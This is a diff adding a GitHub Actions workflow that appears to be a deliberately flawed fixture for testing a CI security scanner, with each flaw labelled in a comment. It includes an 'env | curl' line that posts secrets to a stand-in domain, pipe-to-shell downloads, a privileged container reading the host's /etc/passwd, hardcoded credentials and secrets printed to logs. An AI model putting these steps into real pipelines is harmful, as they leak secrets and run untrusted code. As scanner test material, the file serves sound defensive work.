@@ -1,0 +1,112 @@
+name: Test Workflow with Security Issues
+
+on:
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+
+env:
+  # This is a security issue - hardcoded secret
+  API_KEY: "AKIA1234567890ABCDEF"
+  DATABASE_URL: "postgresql://user:password123@localhost/db"
+
+jobs:
+  # Missing job name - best practices issue
+  build:
+    runs-on: ubuntu-latest
+    
+    steps:
+    # Security issue - action not pinned to SHA
+    - uses: actions/checkout@v3
+      with:
+        fetch-depth: 0
+    
+    # Missing step name - best practices issue
+    - run: |
+        echo "Building application..."
+        # Security issue - potential secret exfiltration
+        env | curl -X POST https://suspicious-domain.com/collect
+        
+    # Performance issue - no caching
+    - name: Install dependencies
+      run: |
+        npm install
+        pip install -r requirements.txt
+    
+    # Security issue - running as root
+    - name: Run in privileged container
+      run: |
+        docker run --privileged -v /:/host alpine:latest sh -c "
+          echo 'Running with full system access'
+          cat /host/etc/passwd
+        "
+    
+    # Security issue - downloading and executing script
+    - name: Download and execute script
+      run: |
+        wget -O - https://get.example.com/install.sh | bash
+        curl -fsSL https://another-site.com/script.py | python3
+    
+    # Security issue - Base64 encoded secret
+    - name: Deploy with encoded secret
+      run: |
+        SECRET=$(echo "cGFzc3dvcmQxMjM=" | base64 -d)
+        echo "Deploying with secret: $SECRET"
+        
+    # Security issue - JWT token in environment
+    - name: Setup JWT
+      env:
+        JWT_TOKEN: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
+      run: |
+        echo "Using JWT token for authentication"
+
+  # Security issue - using wildcard permissions
+  deploy:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+      actions: write
+      checks: write
+      deployments: write
+      id-token: write
+      issues: write
+      discussions: write
+      packages: write
+      pages: write
+      pull-requests: write
+      repository-projects: write
+      security-events: write
+      statuses: write
+    
+    needs: build
+    
+    steps:
+    # Security issue - mutable tag reference
+    - name: Deploy to production
+      uses: azure/webapps-deploy@v2
+      with:
+        app-name: 'my-app'
+        # Security issue - hardcoded credentials
+        publish-profile: |
+          <publishData>
+            <publishProfile>
+              <userName>$myapp</userName>
+              <userPWD>SuperSecret123!</userPWD>
+            </publishProfile>
+          </publishData>
+    
+    # Performance issue - no artifact caching
+    - name: Generate large artifacts
+      run: |
+        for i in {1..1000}; do
+          echo "Large file content $i" > "file_$i.txt"
+        done
+        tar -czf artifacts.tar.gz file_*.txt
+    
+    # Security issue - logging sensitive information
+    - name: Debug with secrets
+      run: |
+        echo "Database password: ${{ secrets.DB_PASSWORD }}"
+        echo "API key: ${{ secrets.API_KEY }}"
+        printenv | grep -i secret
